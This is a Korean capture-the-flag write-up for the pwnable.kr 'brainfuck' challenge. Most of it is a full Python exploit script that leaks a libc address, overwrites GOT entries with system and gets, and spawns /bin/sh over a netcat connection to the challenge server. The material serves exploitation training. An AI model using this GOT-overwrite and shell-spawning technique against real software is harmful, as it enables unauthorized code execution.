## brainfuck

## 문제

> I made a simple brain-fuck language emulation program written in C.   
> The \[ \] commands are not implemented yet. However the rest functionality seems working fine.   
> Find a bug and exploit it to get a shell.
>
> Download : [http://pwnable.kr/bin/bf](http://pwnable.kr/bin/bf)  
> Download : [http://pwnable.kr/bin/bf\_libc.so](http://pwnable.kr/bin/bf_libc.so)
>
> Running at : nc pwnable.kr 9001

## 소스 {#취약점}

문제에서 bf파일이 ELF 파일이고 bf\_libc.so는 동적 라이브러리 파일입니다. 참고하시기 바랍니다.

## 취약점 {#취약점}

* 일반적인 난해한 프로그래밍 언어가 그러하듯 브레인퍽에서도 포인터를 이용한다.
* 소스가 공개되어 있다.

## 힌트 {#힌트}

* [PLT&GOT](/system/plt-and-got.md) 익스플로잇
* netcat를 이용한 스크립트 작성

## 공략 {#공략}

대부분의 공개된 공략법은 영문, 중문으로 되어 있고 또한 파이썬 pwn 라이브러리를 이용하였습니다만 이 공략에서는 pwn 라이브러리를 이용하지 않고 공략하는 방법을 서술하였습니다.

## 참고 페이지 {#공략}

* [https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/](https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/)

* [https://namu.wiki/w/BrainFuck](https://namu.wiki/w/BrainFuck)

```python
import nclib
import time
import binascii
# from pwn import ELF

# libc = ELF("./bf_libc.so")

nc = nclib.Netcat(("pwnable.kr", 9001))
time.sleep(2)
print(nc.recv())

# bf
p = tape     = 0x0804a0a0
got_fgets    = 0x0804a010
got_memset   = 0x0804a02c

# bf_libc.so
so_fgets    = 0x0005d540
so_system   = 0x0003a920
so_gets     = 0x0005e770
main        = 0x08048671


# script
str=""
# 포인터를 fgets@GOT로 가리킴
str+='<'*(p-got_fgets)
# fgets@GOT 주소 출력
str+='.>'*4
# fgets@GOT 주소 삭제
str+='<'*4
# fgets@GOT 주소를 call system으로 수정
str+=',>'*4
# 포인터를 memset@GOT로 가리킴. memset@GOT - fgets@GOT
str+='<'*4 + '>' * (got_memset - got_fgets)
# memset@GOT 주소를 call fgets로 수정
str+=',>'*4
# putchar@GOT를 main 시작 주소로 수정
str+=',>'*4
# putchar(=main) 호출
str+='.'
# end
str+='\n'
nc.send(str.encode())
time.sleep(1)

# fgets_addr = int(binascii.hexlify(nc.recv()), 16)
addr = nc.recv(4)
print(addr)    
fgets_addr = int.from_bytes(addr, byteorder='little')
system_addr = fgets_addr - so_fgets + so_system
gets_addr = fgets_addr - so_fgets + so_gets
print('fgets_addr :', hex(fgets_addr))
print('system_addr :', hex(system_addr))
print('gets_addr :', hex(gets_addr))
print('main_addr :', hex(main))
nc.send(system_addr.to_bytes(4, byteorder='little'))
nc.send(gets_addr.to_bytes(4, byteorder='little'))
nc.send(main.to_bytes(4, byteorder='little'))
# addrs = system_addr.to_bytes(4, byteorder='little')+ gets_addr.to_bytes(4, byteorder='little')+ main.to_bytes(4, byteorder='little')
# nc.send(addrs + b'/bin/sh\n')
nc.send(b'/bin/sh\n')

nc.interact()
```



